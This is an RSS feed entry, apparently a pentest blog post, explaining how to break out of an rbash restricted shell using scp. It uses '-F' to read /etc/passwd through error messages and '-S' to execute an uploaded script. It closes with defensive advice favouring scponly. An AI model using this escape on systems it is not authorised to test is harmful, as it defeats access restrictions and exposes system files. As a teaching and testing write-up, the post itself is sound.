<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>rbash &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/rbash/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Sat, 20 Aug 2011 16:06:49 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>Breaking out of rbash using scp</title>
		<link>https://pentestmonkey.net/blog/rbash-scp</link>
					<comments>https://pentestmonkey.net/blog/rbash-scp#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Thu, 12 Apr 2007 19:59:16 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[rbash]]></category>
		<category><![CDATA[scp]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=10</guid>

					<description><![CDATA[I was recently challenged to break out of a restricted shellenvironment in which the only accessible command was scp. The Restricted Environment The environment had a PATH set to /rbashbin which wasn&#8217;t writable. untrusted@demobox ~ $ echo $PATH /rbashbin The only command in /rbashbin was scp. The home directory of the &#8220;untrusted&#8221; user was owned [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I was recently challenged to break out of a <a href="http://www.softpanorama.org/Scripting/Shellorama/restricted_shell.shtml">restricted shell</a>environment in which the only accessible command was scp.</p>
<p><span id="more-10"></span></p>
<h3>The Restricted Environment</h3>
<p>The environment had a PATH set to /rbashbin which wasn&#8217;t writable.</p>
<pre>untrusted@demobox ~ $ echo $PATH
/rbashbin</pre>
<p>The only command in /rbashbin was scp.</p>
<p>The home directory of the &#8220;untrusted&#8221; user was owned by root, but was writable to allow file uploads. However, due to the restrictions on the PATH it was not possible to directly execute any files that were uploaded. Normal system commands too were inaccessible:</p>
<pre>untrusted@demobox ~ $ id
-su: id: command not found</pre>
<p>The .bash_profile and .bashrc files were owned by root and were not writable, so it wasn&#8217;t possible to overwrite these with ones containing malicious commands.</p>
<p>.bash_logout could be created and filled with commands, but these all ran under rbash, so failed.</p>
<p>After all the usual tricks had failed I resorted to reading the man page for scp (some another box since running &#8220;man&#8221; wasn&#8217;t allowed). I noticed two useful command line options:</p>
<h3>Reading files with -F</h3>
<pre>     -F ssh_config
             Specifies an alternative per-user configuration file for ssh.  This option is directly passed to ssh(1).</pre>
<p>This options can be used to &#8220;cat&#8221; certain types of file:</p>
<pre>untrusted@demobox ~ $ scp -F /etc/passwd x y:
/etc/passwd: line 1: Bad configuration option: root:x:0:0:root:/root:/bin/bash
/etc/passwd: line 2: Bad configuration option: bin:x:1:1:bin:/bin:/bin/false
/etc/passwd: line 3: Bad configuration option: daemon:x:2:2:daemon:/sbin:/bin/false
...</pre>
<h3>Running commands with -S</h3>
<pre>     -S program
             Name of program to use for the encrypted connection.  The program must understand ssh(1) options.</pre>
<p>Ah, a way to run other commands! However various command line options are passed to your command that you probably don&#8217;t want:</p>
<pre>untrusted@demobox ~ $ scp -S /usr/bin/id x y:
/usr/bin/id: invalid option -- x
Try `/usr/bin/id --help' for more information.
lost connection

untrusted@demobox ~ $ scp -S /bin/echo x y:
-x -oForwardAgent no -oPermitLocalCommand no -oClearAllForwardings yes y scp -t .</pre>
<p>On a box that you control make a simple wrapper script, then upload it:</p>
<pre>$ cat /tmp/id.sh
#!/bin/sh
/usr/bin/id
$ chmod +x /tmp/id.sh
$ scp /tmp/id.sh untrusted@demobox:</pre>
<p>Once the file is uploaded, run it with scp:</p>
<pre>untrusted@demobox ~ $ scp -S /home/untrusted/id.sh x y:
uid=1008(untrusted) gid=1014(untrusted) groups=1014(untrusted)</pre>
<p>This is not a vulnerability in rbash or in scp, it&#8217;s just that the two shouldn&#8217;t be used together in the environment above. <a href="http://sublimation.org/scponly/wiki/index.php/Main_Page">scponly</a> is probably a better solution.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/rbash-scp/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
